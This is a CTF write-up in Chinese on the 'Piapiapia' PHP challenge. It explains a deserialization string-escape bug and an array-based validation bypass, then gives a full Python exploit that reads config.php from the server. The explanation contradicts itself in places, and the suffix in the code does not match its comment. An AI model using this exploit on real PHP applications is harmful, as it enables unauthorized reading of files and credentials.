---
title: 'Piapiapia - PHP 反序列化字符串逃逸'
date: '2026-07-19T00:00:00Z'
modifiedTime: '2026-07-19T00:00:00Z'
intro: 'CTF 平台: DASCTF'
tags: ['ctf', 'writeup', 'cve', 'sql注入', '反序列化', '文件上传', 'php', 'python', '序列化']
cover: ''
---
# Piapiapia - PHP 反序列化字符串逃逸

> **CTF 平台**: DASCTF  
> **题目类型**: Web  
> **难度**: 中等  
> **关键词**: PHP反序列化、字符串逃逸、数组绕过  
> **Flag**: `CTF2{47ffbeca-0659-4a45-8ca7-8af74c65babf}`

---

## 1. 题目信息

**靶机地址**: `http://xxxxx.http-ctf2.dasctf.com/`

**服务器环境**:
- PHP 5.6.40 / OpenResty (nginx 1.14.2)
- MySQL (root / qwertyuiop)
- 数据库名: `challenges`
- Web根目录: `/var/www/html/`

---

## 2. 信息收集

### 2.1 目录扫描

使用 `dirsearch` 或 `gobuster` 扫描目录，发现 `www.zip` 源码泄露：

```
www.zip          → 源码压缩包
register.php     → 注册页面
update.php       → 资料更新页面
profile.php      → 资料展示页面
class.php        → 类定义（含 filter 函数）
config.php       → 数据库配置（含 $flag 变量）
```

### 2.2 源码分析

#### config.php
```php
<?php
$config['hostname'] = '127.0.0.1';
$config['username'] = 'root';
$config['password'] = 'qwertyuiop';
$config['database'] = 'challenges';
$flag = '';  // 服务器上为实际 flag
?>
```

#### update.php - 核心逻辑
```php
if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
    // 输入校验
    if(!preg_match('/^\d{11}$/', $_POST['phone']))          die('Invalid phone');
    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
        die('Invalid email');
    if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
        die('Invalid nickname');

    $file = $_FILES['photo'];
    if($file['size'] < 5 or $file['size'] > 1000000) die('Photo size error');

    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
    $profile['phone'] = $_POST['phone'];
    $profile['email'] = $_POST['email'];
    $profile['nickname'] = $_POST['nickname'];
    $profile['photo'] = 'upload/' . md5($file['name']);

    $user->update_profile($username, serialize($profile));
}
```

#### class.php - 漏洞根源
```php
public function update_profile($username, $new_profile) {
    $username = parent::filter($username);
    $new_profile = parent::filter($new_profile);  // ← 对序列化字符串执行 filter
    $where = "username = '$username'";
    return parent::update($this->table, 'profile', $new_profile, $where);
}

public function filter($string) {
    // 替换 SQL 特殊字符
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    // 替换 SQL 关键字
    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
```

#### profile.php - 漏洞触发点
```php
$profile = unserialize($profile);       // 反序列化
$phone = $profile['phone'];
$email = $profile['email'];
$nickname = $profile['nickname'];
$photo = base64_encode(file_get_contents($profile['photo']));  // ← 读取文件
```

---

## 3. 漏洞分析

### 3.1 字符串逃逸原理

`filter()` 函数将 `where`（5字符）替换为 `hacker`（6字符），**每次替换膨胀1字节**。

其他关键字长度不变：
| 关键字 | 替换为 | 长度变化 |
|--------|--------|----------|
| select | hacker | 6→6 (不变) |
| insert | hacker | 6→6 (不变) |
| update | hacker | 6→6 (不变) |
| delete | hacker | 6→6 (不变) |
| **where** | **hacker** | **5→6 (+1)** |

### 3.2 序列化格式

PHP `serialize()` 生成的字符串包含**长度声明**：
```
a:4:{s:5:"phone";s:11:"17725532553";s:5:"email";s:14:"test@qq.com";s:8:"nickname";s:5:"hello";s:5:"photo";s:39:"upload/MD5HASH";}
```

关键：`s:N:"VALUE"` 中的 `N` 是声明长度。如果 `VALUE` 因 filter 膨胀，但 `N` 不变，反序列化器读取 `N` 字节后会在**错误位置**寻找闭合引号 `"`。

### 3.3 nickname[] 数组绕过

`update.php` 的校验：
```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
```

当发送 `nickname[]=payload` 时，`$_POST['nickname']` 是一个**数组**：
- `preg_match()` 对数组返回 `false`（Warning）→ `!false` = `true`？不，实际返回 Warning 但不 die
- `strlen()` 对数组返回 `null`（Warning）→ `null > 10` = `false`
- 整体条件: `false || false` = `false` → **校验通过！**

---

## 4. 漏洞利用

### 4.1 Payload 构造

**核心公式**：
```
nickname[] = "where" × 34 + suffix
```

其中：
- **34 个 `where`**：filter 后每个 +1 字节，共膨胀 34 字节
- **suffix** = `";}s:5:"photo";s:10:"config.php";}`（恰好 34 字节）
- **关键**：`where` 数量 **必须等于** suffix 长度

Suffix 结构解析：
```
"}          → 闭合内层元素字符串 (") + 分号 (;) + 大括号 (})
s:5:"photo" → 注入 photo 键
s:10:"config.php" → 注入 photo 值
;}          → 结束整个数组
```

### 4.2 逃逸过程图解

```
【Filter 前 - 内层数组序列化】
a:1:{i:0;s:204:"wherewhere...where";}s:5:"photo";s:10:"config.php";}

【Filter 后 - "where" → "hacker"】
a:1:{i:0;s:204:"hackerhacker...hackers:5:"photo";s:10:"config.php";;}
                                    ↑
                          声明 204 字节，实际 238 字节
                          多出 34 字节 "逃逸" 到外层

【外层 profile 反序列化】
...nickname";s:204:"<内层数组>";s:5:"photo";s:39:"upload/MD5";}
                  ↑
        读取 204 字节后恰好在 suffix 的 " 处闭合
        后续 ";} 闭合内层数组
        s:5:"photo";s:10:"config.php";} 成为新的 photo 字段！
```

### 4.3 完整 Exploit

```python
#!/usr/bin/env python3
import requests, re, base64

URL = "http://TARGET_URL"
N = 34
suffix = '"\x7d;s:5:"photo";s:10:"config.php";\x7d'
# 实际: '";}s:5:"photo";s:10:"config.php";}'
payload = "where" * N + suffix

# 1. 注册登录
s = requests.Session()
s.post(f"{URL}/register.php", data={"username": "user", "password": "pass123"})
s.post(f"{URL}/index.php", data={"username": "user", "password": "pass123"})

# 2. 设置初始 profile
jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF" + b"\x00" * 10000
s.post(f"{URL}/update.php", files={
    "phone": (None, "17725532553"),
    "email": (None, "test@qq.com"),
    "nickname": (None, "hello"),
    "photo": ("test.jpg", jpeg, "image/jpeg"),
})

# 3. 发送 exploit (nickname[] 绕过验证)
boundary = "----Exploit"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="phone"\r\n\r\n17725532553\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="email"\r\n\r\ntest@qq.com\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="nickname[]"\r\n\r\n{payload}\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="photo"; filename="test.jpg"\r\n'
    f"Content-Type: image/jpeg\r\n\r\n"
)
body_bytes = body.encode() + jpeg + f"\r\n--{boundary}--\r\n".encode()
requests.post(f"{URL}/update.php", data=body_bytes,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    cookies=s.cookies)

# 4. 获取 flag
resp = s.get(f"{URL}/profile.php")
photo = re.search(r'base64,([A-Za-z0-9+/=]+)', resp.text)
if photo:
    print(base64.b64decode(photo.group(1)).decode())
```

---

## 5. Flag

```
CTF2{47ffbeca-0659-4a45-8ca7-8af74c65babf}
```

---

## 6. 关键要点

1. **字符串逃逸核心**：filter 改变序列化字符串长度，但不改变长度声明 `s:N:`，导致反序列化器读取位置偏移
2. **数组绕过验证**：`nickname[]` 使 `$_POST['nickname']` 成为数组，绕过 `preg_match` 和 `strlen` 校验
3. **精确对齐**：`where` 数量必须等于 suffix 长度（此处均为 34），确保 PHP 读取 N 字节后恰好在 suffix 的 `"` 处闭合字符串
4. **Suffix 结构**：必须以 `";}` 开头（闭合内层元素引号 + 分号 + 大括号），而非仅 `"}`
5. **file_get_contents** 可读取服务器任意文件，配合序列化逃逸实现任意文件读取

---

## 7. 参考

- [PHP 序列化与反序列化 - 安全客](https://www.anquanke.com/post/id/193306)
- [Piapiapia - CTFHub](https://www.ctfhub.com/)
- [PHP 字符串逃逸详解 - 先知社区](https://xz.aliyun.com/)
